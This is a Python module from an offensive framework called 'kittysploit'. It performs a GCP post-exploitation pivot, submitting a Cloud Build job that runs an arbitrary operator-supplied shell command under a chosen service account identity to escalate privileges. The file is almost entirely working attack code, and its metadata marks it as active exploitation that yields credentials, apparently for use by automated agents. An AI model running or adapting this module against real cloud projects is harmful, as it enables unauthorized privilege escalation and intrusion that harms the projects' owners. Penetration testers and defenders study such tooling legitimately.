#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import time

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Cloud Build Pivot as Service Account",
        "description": "Run an arbitrary command in Cloud Build under a target service account identity",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "cloud-build", "pivot", "privilege-escalation"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation', 'api_request'],
        'expected_requests': 3,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    command = OptString("", "Shell command to execute inside the Cloud Build worker", True)
    service_account_email = OptString("", "Service account identity for the build; empty uses default Cloud Build SA", False)
    builder_image = OptString("ubuntu", "Cloud Build worker image", False)
    timeout = OptString("600s", "Build timeout", False)
    wait_for_completion = OptBool(True, "Poll build status until completion or timeout", False)
    poll_seconds = OptInteger(10, "Polling interval while waiting for build completion", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            command = str(self.command or "").strip()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False
            if not command:
                print_error("command is required")
                return False

            sa = str(self.service_account_email or "").strip()
            print_info("Submitting Cloud Build pivot job...")
            if sa:
                print_info(f"Target service account: {sa}")

            steps = [
                {
                    "name": str(self.builder_image or "ubuntu"),
                    "entrypoint": "bash",
                    "args": ["-c", command],
                }
            ]
            created = self._gcp_create_cloud_build(
                project_id,
                steps,
                service_account=sa,
                timeout=str(self.timeout or "600s"),
            )
            if not created.get("ok"):
                print_error(f"Cloud Build submission failed: {created.get('error', '')}")
                return False

            build = created.get("build") or {}
            build_id = str(build.get("id") or "").strip()
            status = build.get("status")
            print_success(f"Cloud Build submitted: {build_id or 'unknown'} status={status}")
            if build.get("logUrl"):
                print_info(f"Logs: {build.get('logUrl')}")

            final_build = build
            if self.wait_for_completion and build_id:
                final_build = self._wait_for_build(project_id, build_id) or build

            output = {
                "project_id": project_id,
                "service_account_email": sa,
                "command": command,
                "build_id": build_id,
                "status": final_build.get("status"),
                "logUrl": final_build.get("logUrl"),
                "build": final_build,
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"Cloud Build pivot failed: {exc}")
            return False

    def _wait_for_build(self, project_id, build_id):
        timeout_s = self._parse_timeout_seconds(str(self.timeout or "600s"))
        poll_s = max(3, int(self.poll_seconds or 10))
        deadline = time.time() + timeout_s
        latest = None
        while time.time() < deadline:
            result = self._gcp_get_cloud_build(project_id, build_id)
            if not result.get("ok"):
                print_warning(f"Build status poll failed: {result.get('error', '')}")
                break
            latest = result.get("build") or {}
            status = str(latest.get("status") or "")
            print_info(f"Build status: {status}")
            if status in ("SUCCESS", "FAILURE", "CANCELLED", "TIMEOUT", "EXPIRED"):
                break
            time.sleep(poll_s)
        return latest

    @staticmethod
    def _parse_timeout_seconds(timeout_value):
        text = str(timeout_value or "600s").strip().lower()
        if text.endswith("s"):
            try:
                return max(30, int(text[:-1]))
            except Exception:
                return 600
        try:
            return max(30, int(text))
        except Exception:
            return 600
